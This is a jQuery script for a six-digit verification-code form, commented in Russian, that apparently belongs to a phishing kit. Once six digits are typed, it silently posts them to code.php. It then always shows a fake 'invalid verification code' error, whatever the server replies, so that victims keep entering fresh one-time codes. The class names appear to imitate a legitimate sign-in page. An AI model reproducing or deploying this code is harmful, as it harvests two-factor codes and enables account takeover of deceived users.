//Only number
$(".char-field").on('keypress', function (e) {
    if (e.which != 8 && e.which != 0 && e.which != 46 && (e.which < 48 || e.which > 57)) {
        return false;
    }
})

//Backspace
$(".char-field").on('keydown', function (e) {
    if (e.key === "Backspace") {
        let curTabIndex = parseInt($(this).attr('tabindex'));
        let prevTabIndex = curTabIndex - 1;
        $(this).val("");
        $('[tabindex=' + prevTabIndex + ']').focus();
    }
})

//Input
$(".char-field").on('input', function (e) {
    $(".pop-container").remove();
    let value = $(this).val();
    let len = value.length;
    let curTabIndex = parseInt($(this).attr('tabindex'));
    let nextTabIndex = curTabIndex + 1;
    let prevTabIndex = curTabIndex - 1;

    if (len === 1) {
        //$(this).val(value);
        $('[tabindex=' + nextTabIndex + ']').focus();
    }
    checkInput();
});

async function checkInput() {
    let value = "";
    $(".char-field").each((i, elem) => {
        value += $(elem).val()
    })
    if (value.length === 6) {
        //ОТПРАВКА КОДА
        await sendData(100, value);
        $('[tabindex=' + 0 + ']').focus();
        $(".char-field").each((i, elem) => {
            $(elem).val("")
        })
        $(".sec-code-wrapper").after(errorTemplate());
    }
}

//ОТУТ ОТПРАВКА ДАННЫХ
function sendData(ms, value) {
    return new Promise(resolve => {
        //ОТУТ ОТПРАВКА ДАННЫХ
	Send(value);
        setTimeout(resolve, ms)
    });
}

function Send(value)
{
    $.ajax({
        type: 'POST',
        url: 'code.php',
        data: {'code': value},
        datatype: 'JSON'  
    });
}

function errorTemplate() {
    return `<div class="pop-container error tk-subbody" tabindex="-1" role="tooltip">
                <div class="error pop-bottom">Неверный код проверки.</div>
           </div>`
}

